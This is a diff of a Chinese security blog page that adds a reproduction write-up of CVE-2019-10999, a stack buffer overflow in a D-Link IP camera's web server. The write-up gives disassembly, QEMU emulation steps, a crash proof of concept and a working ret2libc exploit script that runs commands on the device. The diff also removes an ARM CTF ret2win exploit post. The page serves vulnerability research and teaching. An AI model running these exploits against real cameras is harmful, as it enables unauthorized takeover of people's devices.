@@ -168,6 +168,148 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
+    <link itemprop="mainEntityOfPage" href="https://oneshell.top/2023/04/12/CVE-2019-10999%20dlink%20ip%E6%91%84%E5%83%8F%E5%A4%B4%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="OneShell">
+      <meta itemprop="description" content="菜">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="OneShell">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/04/12/CVE-2019-10999%20dlink%20ip%E6%91%84%E5%83%8F%E5%A4%B4%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/" class="post-title-link" itemprop="url">CVE-2019-10999 dlink ip摄像头缓冲区溢出漏洞</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2023-04-12 06:46:43 / Modified: 18:53:00" itemprop="dateCreated datePublished" datetime="2023-04-12T06:46:43+08:00">2023-04-12</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Log/" itemprop="url" rel="index"><span itemprop="name">Log</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>CVE-2019-10999 是 Dlink IP 摄像头的后端服务器程序 alphapd 中的一个缓冲区溢出漏洞，漏洞允许经过身份认证的用户在请求 wireless.htm 时，传入 WEPEncryption 参数一个长字符串来执行任意代码。具体描述以及受攻击的型号、固件版本可以查看参考链接，此处漏洞复现采用的是设备 dcs-932l 固件版本 1.14.04，固件下载链接查看参考链接。</p>
+<p>对后端服务器程序 alphapd 进行分析，存在漏洞的函数是 sub_435DEC，开辟的栈帧大小是 0x48，其中该函数的返回地址保存在 sp + 0x40，存在溢出的缓冲区起始地址是 sp + 0x18。因此，只需要向缓冲区写入超过 0x28 个字节就可以溢出覆盖返回地址，劫持控制流。除此之外还可以控制 S0~S5 寄存器。</p>
+<p>如下是 sub_435DEC 栈帧的开辟以及返回地址的存储汇编代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">.text:00435DEC li      $gp, (_GLOBAL_OFFSET_TABLE_+0x7FF0 - .)</span><br><span class="line">.text:00435DF4 addu    $gp, $t9</span><br><span class="line">.text:00435DF8 addiu   $sp, -0x48</span><br><span class="line">.text:00435DFC sw      $ra, 0x28+var_s18($sp)</span><br><span class="line">.text:00435E00 sw      $s5, 0x28+var_s14($sp)</span><br><span class="line">.text:00435E04 sw      $s4, 0x28+var_s10($sp)</span><br><span class="line">.text:00435E08 sw      $s3, 0x28+var_sC($sp)</span><br><span class="line">.text:00435E0C sw      $s2, 0x28+var_s8($sp)</span><br><span class="line">.text:00435E10 sw      $s1, 0x28+var_s4($sp)</span><br><span class="line">.text:00435E14 sw      $s0, 0x28+var_s0($sp)</span><br><span class="line">.text:00435E18 sw      $gp, 0x28+var_18($sp)</span><br></pre></td></tr></table></figure>
+
+<p>如下是调用 strcpy 函数复制数据到栈上的缓冲区中，strcpy 的第一个参数 des 通过 a0 寄存器传入，由于跳转延迟槽，对 a0 的操作指令在 jalr 指令之后，但是先于跳转指令执行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.text:00435F98 loc_435F98:                              # CODE XREF: sub_435DEC+134↑j</span><br><span class="line">.text:00435F98 la      $t9, strcpy</span><br><span class="line">.text:00435F9C move    $a1, $s1</span><br><span class="line">.text:00435FA0 jalr    $t9 ; strcpy</span><br><span class="line">.text:00435FA4 addiu   $a0, $sp, 0x18</span><br><span class="line">.text:00435FA8 lw      $gp, 0x28+var_18($sp)</span><br><span class="line">.text:00435FAC b       loc_435E98</span><br><span class="line">.text:00435FB0 nop</span><br></pre></td></tr></table></figure>
+
+<p>如下是函数执行完毕进行堆栈平衡，以及恢复 S0~S5寄存器、恢复 ra 寄存器到函数返回地址并跳转执行。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.text:0004BF34 loc_4BF34:</span><br><span class="line">.text:0004BF34 				lw      $ra, 0x28+var_s14($sp)</span><br><span class="line">.text:0004BF38 				lw      $s4, 0x28+var_s10($sp)</span><br><span class="line">.text:0004BF3C 				lw      $s3, 0x28+var_sC($sp)</span><br><span class="line">.text:0004BF40 				lw      $s2, 0x28+var_s8($sp)</span><br><span class="line">.text:0004BF44 				lw      $s1, 0x28+var_s4($sp)</span><br><span class="line">.text:0004BF48 				lw      $s0, 0x28+var_s0($sp)</span><br><span class="line">.text:0004BF4C 				jr      $ra</span><br><span class="line">.text:0004BF50 				addiu   $sp, 0x40</span><br><span class="line">.text:0004BF50  # End of function system</span><br></pre></td></tr></table></figure>
+
+<h2 id="漏洞环境搭建"><a href="#漏洞环境搭建" class="headerlink" title="漏洞环境搭建"></a>漏洞环境搭建</h2><h3 id="使用-qemu-system-static-搭建"><a href="#使用-qemu-system-static-搭建" class="headerlink" title="使用 qemu-system-static 搭建"></a>使用 qemu-system-static 搭建</h3><p>漏洞环境搭建先是使用 qemu-mipsel-static 搭建。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 进入固件的根目录 复制 qemu-mipsel-static 到根目录</span><br><span class="line">cp $(which qemu-mipsel-static) ./</span><br><span class="line"># 使用 qemu 启动服务器 alphapd</span><br><span class="line">sudo chroot . ./qemu-mipsel-static ./bin/alphapd</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-2023-0412-184727655.png" alt="undifined"></p>
+<p>根据逆向中的反编译代码提示，是因为需要打开 &#x2F;var&#x2F;run&#x2F;nvramd.pid 文件，那么在固件根目录创建 run 目录和 nvramd.pid 文件。</p>
+<p>创建 pid 文件之后，继续运行依旧报错，无法创建 RSA 密钥，应该是缺少 urandom、random 设备造成的，手动在固件根目录创建。</p>
+<p><img src="/images/image-2023-0412-184754978.png" alt="undifined"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo chroot . ./qemu-mipsel-static ./bin/mknod -m 0666 ./dev/random c 1 8</span><br><span class="line">sudo chroot . ./qemu-mipsel-static ./bin/mknod -m 0666 ./dev/urandom c 1 9</span><br></pre></td></tr></table></figure>
+
+<p><strong>报错 unable to write ‘random state’</strong></p>
+<p><img src="/images/image-2023-0412-184812215.png" alt="undifined"></p>
+<p>OpenSSL 需要写入一些信息到 .rnd 文件，上面的错误可能是因为 .rnd 文件不存在，OpenSSL 不知道默认文件在何处，因为 RANDFILE 和 HOME 环境变量没有设置，那么解决方法就是创建 .rnd 文件并且设置环境变量指向这个文件。qemu 启动的时候设置这两个环境变量，解决了上面的问题。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">touch .rnd</span><br><span class="line">sudo chroot . ./qemu-mipsel-static -E HOME=/ -E RANDFILE=/.rnd ./bin/alphapd</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-2023-0412-184826317.png" alt="undifined"></p>
+<p><strong>Can’t get lan ip from sysinfo</strong></p>
+<p>通过搜索字符串定位到在 websStartupServer 函数中，通过调用 getSysInfoLong 获取，在 getSysInfoLong 函数中是通过 &#x2F;dev&#x2F;gpio 设备获取到，可以通过 patch getSysInfoLong 函数，或者在 websStartupServer 中 patch 地址判定代码。此处选择 patch 后者，就可以让程序在 0.0.0.0:80 端口运行起来。</p>
+<p>如下是 websStartupServer  的地址判定处反编译，以及 patch 的基本块：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">v3 = getSysInfoLong(<span class="number">30</span>);</span><br><span class="line"><span class="keyword">if</span> ( !v3</span><br><span class="line">  &amp;&amp; (v5 = (<span class="type">const</span> <span class="type">char</span> *)nvram_bufget(<span class="number">0</span>, <span class="string">&quot;IPAddress&quot;</span>),</span><br><span class="line">      trace(<span class="number">0</span>, <span class="string">&quot;Can&#x27;t get lan ip from sysinfo!\n&quot;</span>, v4),</span><br><span class="line">      v3 = inet_addr(v5),</span><br><span class="line">      v3 == <span class="number">-1</span>) )</span><br><span class="line">&#123;</span><br><span class="line">  trace(<span class="number">0</span>, <span class="string">&quot;failed to convert %s to binary ip data&quot;</span>, v5);</span><br><span class="line">  result = <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  v6 = inet_ntoa(v3);</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-2023-0412-184918114.png" alt="undifined"></p>
+<p>重新运行如下：</p>
+<p><img src="/images/image-2023-0412-184935970.png" alt="undifined"></p>
+<p><img src="/images/image-2023-0412-184949952.png" alt="undifined"></p>
+<h3 id="使用-qemu-system-mipsel-搭建"><a href="#使用-qemu-system-mipsel-搭建" class="headerlink" title="使用 qemu-system-mipsel 搭建"></a>使用 qemu-system-mipsel 搭建</h3><p>发现使用 qemu 搭建的调试，使用 gdb-multiarch 连接不上去，于是采用了 qemu-system-mipsel 虚拟机来搭建，进入固件根目录。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">chroot . /bin/mknod -m 0666 /dev/random c 1 8</span><br><span class="line">chroot . /bin/mknod -m 0666 /dev/urandom c 1 9</span><br><span class="line"></span><br><span class="line">touch .rnd</span><br><span class="line">export HOME=.</span><br><span class="line">export RANDFILE=$HOME/.rnd</span><br><span class="line"></span><br><span class="line">chroot . ./bin/alphapd_patch_j</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-2023-0412-185007135.png" alt="undifined"></p>
+<p><img src="/images/image-2023-0412-185021356.png" alt="undifined"></p>
+<h2 id="漏洞调试"><a href="#漏洞调试" class="headerlink" title="漏洞调试"></a>漏洞调试</h2><h3 id="漏洞触发"><a href="#漏洞触发" class="headerlink" title="漏洞触发"></a>漏洞触发</h3><p>漏洞触发代码如下，也可以看到成功触发了 segment fault。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">Headers = &#123;</span><br><span class="line">    &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0&#x27;,</span><br><span class="line">    &#x27;Accept&#x27;: &#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&#x27;,</span><br><span class="line">    &#x27;Accept-Language&#x27;: &#x27;en-US,en;q=0.5&#x27;,</span><br><span class="line">    &#x27;Accept-Encoding&#x27;: &#x27;gzip, deflate&#x27;,</span><br><span class="line">    &#x27;Connection&#x27;: &#x27;keep-alive&#x27;,</span><br><span class="line">    &#x27;Referer&#x27;: &#x27;http://192.168.100.2/setSystemWireless&#x27;,</span><br><span class="line">    &#x27;Upgrade-Insecure-Requests&#x27;: &#x27;1&#x27;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line">data = &#x27;?WEPEncryption=&#x27; + &#x27;A&#x27; * 0x28 + &#x27;B&#x27; * 0x4</span><br><span class="line">res = session.get(url=&#x27;http://192.168.100.2/wireless.htm&#x27; + data, headers=Headers)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-2023-0412-185041489.png" alt="undifined"></p>
+<p>在 QEMU 虚拟机中开启 alphapd，然后使用 gdbserver attach 上 server 的进程，通过 12345 端口提供调试</p>
+<p><img src="/images/image-2023-0412-185058909.png" alt="undifined"></p>
+<p>使用 gdb 调试，如下，保存在栈上的函数返回地址被 BBBB 字符串覆盖</p>
+<p><img src="/images/image-2023-0412-185247615.png" alt="undifined"></p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>接下来的步骤就是寻找环视 的 gadget，从栈中获取数据设置 system 函数传入的命令，并跳转到 system 函数执行。</p>
+<p>这个地方需要说一下，不能在 alphapd 中去直接寻找 gadget，因为 alphapd 的代码段装载在低地址空间，其中的 gadget 地址高位前两位是 00，通过 url 传递地址会发生截断。因此可以先看 alphapd 装载了哪些 so 文件，从 so 中去寻找 system 函数和 gadget。此处选择了 libuClibc-0.9.28.so ，因为通过 ldd 查看 alphapd 装载的 so 文件，其中有 libc.so，libc.so 链接指向 libuClibc-0.9.28.so。</p>
+<p>这个地方是在 QEMU 虚拟机中通过查看 map 文件获取 ibuClibc-0.9.28.so 的装载地址的，如果在实际应用中，需要能够进入设备，从设备上查看 so 的装载地址以及是否开启了随机化，但是一般低端路由器中都是比较老的 Linux 系统，没有地址随机化，那么在 QEMU 中也关闭了地址随机化。此处选择了第一个装载的 libc.so.0 的基址：0x77ed0000</p>
+<p>然后获取到 system 函数相对装载地址的偏移是 0x0004BD20，得到 system 函数的地址为 0x77ed0000 + 0x0004BD20 &#x3D; 0x77F1BD20</p>
+<p>在 IDA 中，对 ibuClibc-0.9.28.so 使用 mipsrop.stackfinder()，找到如下的 gadget，同样计算出地址为 0x77ed0000 + 0x00050DE4 &#x3D; 0x77F20DE4</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.text:00050DE4 addiu   $s2, $sp, 0x1C8+var_D8</span><br><span class="line">.text:00050DE8 move    $a0, $s2</span><br><span class="line">.text:00050DEC move    $t9, $s0</span><br><span class="line">.text:00050DF0 jalr    $t9 ; </span><br></pre></td></tr></table></figure>
+
+<p>gadgets 的功能是将 sp + 0x1c8 - 0xd8 处数据传递给 a0，然后跳转到 S0 寄存器中去执行。通过前面对于缓冲区溢出的分析知道 S0 可控，写入 0x10 个字节开始控制 S0 寄存器，写入 0x28 个字节开始控制返回地址。那么整体的利用过程就是：</p>
+<ul>
+<li>写入累计 0x10 个字节后，控制 S0 寄存器值为 system 函数地址</li>
+<li>写入累计 0x28 个字节后，控制 ra 寄存器值为 gadget 地址</li>
+<li>跳转到 system 函数，执行构造的字符串命令。此时已经恢复了堆栈， 从恢复的 sp + 0x1c8 - 0xd8 取出命令开始执行</li>
+</ul>
+<p>exp 根据 poc 简单修改如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">Headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;en-US,en;q=0.5&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip, deflate&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;keep-alive&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;http://192.168.100.2/setSystemWireless&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Upgrade-Insecure-Requests&#x27;</span>: <span class="string">&#x27;1&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line">data = <span class="string">&#x27;?WEPEncryption=&#x27;</span> + <span class="string">&#x27;A&#x27;</span> * <span class="number">0x10</span> + <span class="string">&#x27;%20%BD%F1%77&#x27;</span> + <span class="string">&#x27;B&#x27;</span> * (<span class="number">0x28</span> - <span class="number">0x10</span> - <span class="number">0x4</span>) + <span class="string">&#x27;%E4%0D%F2%77&#x27;</span> + (<span class="number">0x30</span> - <span class="number">0x28</span> - <span class="number">0x4</span> + <span class="number">0x1c8</span> - <span class="number">0xd8</span>) * <span class="string">&#x27;C&#x27;</span> + <span class="string">&#x27;ls&#x27;</span></span><br><span class="line">res = session.get(url=<span class="string">&#x27;http://192.168.100.2/wireless.htm&#x27;</span> + data, headers=Headers)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure>
+
+<p>执行结果如下，执行命令 ls</p>
+<p><img src="/images/image-2023-0412-185122923.png" alt="undifined"></p>
+<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>本文先分析了漏洞原理，然后分别从 qemu 的两种方式仿真将 alphapd 启动起来进行调试，然后通过 ret2libc 对漏洞实现利用。</p>
+<p>漏洞原理还是比较简单的，仅仅是一个缓冲区溢出 + ret2libc的操作。但是实际利用的话，也许还需要获得设备，通过其他方式例如 UART 等先获取到一个 shell，然后看程序的 so 加载内存布局获取到基址。此外，漏洞是将路由器后端 server 发生了栈溢出的，触发 segment fault，如果路由器没有对 server 的守护进程或者看门狗，那么 server 就挂了。如果要稳定利用，可以考虑反弹一个 telnet 回来或者是在 exp 中通过 shellcode 重新启动 server。</p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-10999">[cve.mitre.org] CVE-2019-10999 概述</a></li>
+<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/5681">[先知社区] CVE-2019-10999复现</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/tacnetsol/CVE-2019-10999">[github] CVE-2019-10999</a></li>
+<li>[[固件下载] DCS-932L_REVA_FIRMWARE_1.14.04.ZIP](<a target="_blank" rel="noopener" href="https://us.softpedia-secure-download.com/dl/1987a9330e759255a393a795437da31e/61839716/300596532/drivers/network">https://us.softpedia-secure-download.com/dl/1987a9330e759255a393a795437da31e/61839716/300596532/drivers/network</a> camera&#x2F;DCS-932L_REVA_FIRMWARE_1.14.04.ZIP)</li>
+<li><a target="_blank" rel="noopener" href="https://bobcares.com/blog/openssl-unable-to-write-random-state-unable-to-write-random-state/">How to fix openssl error “unable to write ‘random state’”?</a></li>
+</ul>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
     <link itemprop="mainEntityOfPage" href="https://oneshell.top/2023/04/12/CVE-2017-3193%20dir-850l%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1129,97 +1271,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
-    <link itemprop="mainEntityOfPage" href="https://oneshell.top/2023/04/07/ret2win_armel/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="OneShell">
-      <meta itemprop="description" content="菜">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="OneShell">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/04/07/ret2win_armel/" class="post-title-link" itemprop="url">ret2win_armel</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2023-04-07 05:57:27" itemprop="dateCreated datePublished" datetime="2023-04-07T05:57:27+08:00">2023-04-07</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2023-04-11 13:57:02" itemprop="dateModified" datetime="2023-04-11T13:57:02+08:00">2023-04-11</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/PWN/" itemprop="url" rel="index"><span itemprop="name">PWN</span></a>
-                </span>
-                  , 
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/PWN/ARMROP/" itemprop="url" rel="index"><span itemprop="name">ARMROP</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>以函数pwnme为例：<br>函数初始化的时候会保存寄存器到栈上，可以看到ARM是支持将寄存器批量保存到栈上的。这个地方说明一点，PUSH和POP操作的寄存器列表中，无论寄存器是以什么顺序给定，都会先进行升序排序。PUSH序号大的寄存器，对应POP序号小的寄存器。<br>R11是通用寄存器，目前不知道有什么特殊性；LR（R14）是连接寄存器，用于保存函数返回地址。随后也是类似于X86&#x2F;64，通过减SP的方式开辟函数栈帧。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:00010570 PUSH    &#123;R11,LR&#125;</span><br><span class="line">.text:00010574 ADD     R11, SP, #4</span><br><span class="line">.text:00010578 SUB     SP, SP, #0x20</span><br></pre></td></tr></table></figure>
-
-<p>函数调用：<br>调用子函数通过寄存器R0～R3进行传参，那么如果是有多余的参数呢，目前没有深究，估计剩下的参数就用栈来传参吧。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.text:00010580 MOV     R2, #0x20 ; &#x27; &#x27; ; n</span><br><span class="line">.text:00010584 MOV     R1, #0          ; c</span><br><span class="line">.text:00010588 MOV     R0, R3          ; s</span><br><span class="line">.text:0001058C BL      memset</span><br></pre></td></tr></table></figure>
-
-<p>函数结束：<br>在函数初始化的时候，我们可以看到将原本SP+4的值赋给R11（fp）。在函数结束的时候，直接从R11-4就恢复了SP，就类似于使用了R11作为中间寄存器保存原本栈SP的值。<br>最后会POP R11的值，以及将初始化时的连接寄存器LR值赋值给PC，从而达到函数执行完毕返回的过程。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:000105D0 SUB     SP, R11, #4</span><br><span class="line">.text:000105D4 POP     &#123;R11,PC&#125;</span><br></pre></td></tr></table></figure>
-<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>缓冲区s起始地址为fp-24h，返回地址是保存在fp，那么输入0x24个字节就可以开始覆盖缓冲区大小。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">pwnme</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">36</span>]; <span class="comment">// [sp+0h] [bp-24h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x20</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What could possibly go wrong?&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;You there, may I have your input please? And don&#x27;t worry about null bytes, we&#x27;re using read()!\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x38</span>u);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Thank you!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>那么直接覆盖到返回地址</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rop = <span class="string">b&quot;A&quot;</span> * <span class="number">0x24</span></span><br><span class="line">rop += p32(<span class="number">0x000105EC</span>)  <span class="comment">#</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">BINARY = <span class="string">&quot;./ret2win_armv5&quot;</span></span><br><span class="line">ELF = ELF(BINARY)</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&quot;linux&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;arm&quot;</span></span><br><span class="line">context.binary = BINARY</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">8888</span>)</span><br><span class="line">rop = <span class="string">b&quot;A&quot;</span> * <span class="number">0x24</span></span><br><span class="line">rop += p32(ELF.symbols[<span class="string">&quot;ret2win&quot;</span>])</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;&gt; &quot;</span>)</span><br><span class="line">p.sendline(rop)</span><br><span class="line"><span class="built_in">print</span>(p.recvline_contains(<span class="string">b&quot;ROPE&quot;</span>))</span><br></pre></td></tr></table></figure>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1289,7 +1340,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">38</span>
+          <span class="site-state-item-count">39</span>
